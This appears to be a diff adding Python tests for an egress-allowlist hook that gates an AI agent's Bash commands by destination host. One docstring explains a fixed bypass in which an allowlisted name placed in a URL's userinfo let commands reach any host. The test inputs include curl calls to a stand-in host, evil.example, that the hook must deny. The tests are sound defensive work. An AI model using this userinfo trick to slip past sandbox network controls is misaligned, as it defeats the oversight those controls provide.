@@ -114,3 +114,44 @@ def test_the_provider_still_derives_the_agnes_host():
     assert "return [host, " in provider_src, (
         "_effective_allow_out no longer leads its fallback with the derived Agnes host"
     )
+
+
+# ── userinfo in the URL ──────────────────────────────────────────────────────
+
+
+def _decide(mod, cmd: str):
+    d = mod._decide({"tool_name": "Bash", "tool_input": {"command": cmd}})
+    out = d.get("hookSpecificOutput", d)
+    return out.get("permissionDecision", "allow"), out.get("permissionDecisionReason") or ""
+
+
+def test_basic_auth_credentials_are_not_read_as_the_hostname():
+    """`split(":")[0]` over the whole authority read the basic-auth USERNAME as
+    the host, and that was wrong in both directions.
+
+    Deny side, watched live: every data-app clone URL is
+    `http://agnes:<jwt>@<host>/data-apps.git/<slug>`, so the hook reported
+    "Outbound network to 'agnes' is not in the Agnes egress allowlist" and
+    refused the clone no matter what the allowlist contained.
+    """
+    mod = _load_hook("https://agnes.example.com")
+    decision, reason = _decide(mod, "git clone http://agnes:JWT@agnes.example.com/data-apps.git/x")
+    assert decision == "allow", reason
+
+
+def test_an_allowed_name_in_the_userinfo_does_not_smuggle_a_denied_host():
+    """Allow side, and the reason this is a security fix rather than a
+    convenience one: `http://api.github.com:pw@evil.example/` extracted
+    `api.github.com` and was ALLOWED while the request went to `evil.example`.
+    Anyone who could get a command run in the sandbox could reach any host by
+    putting an allowlisted name in the userinfo."""
+    mod = _load_hook("https://agnes.example.com")
+    decision, reason = _decide(mod, "curl http://api.github.com:pw@evil.example/x")
+    assert decision == "deny"
+    assert "evil.example" in reason, f"the real host must be named in the refusal: {reason!r}"
+
+
+def test_ordinary_urls_still_decide_the_same_way():
+    mod = _load_hook("https://agnes.example.com")
+    assert _decide(mod, "curl https://api.github.com/repos")[0] == "allow"
+    assert _decide(mod, "curl https://evil.example/x")[0] == "deny"
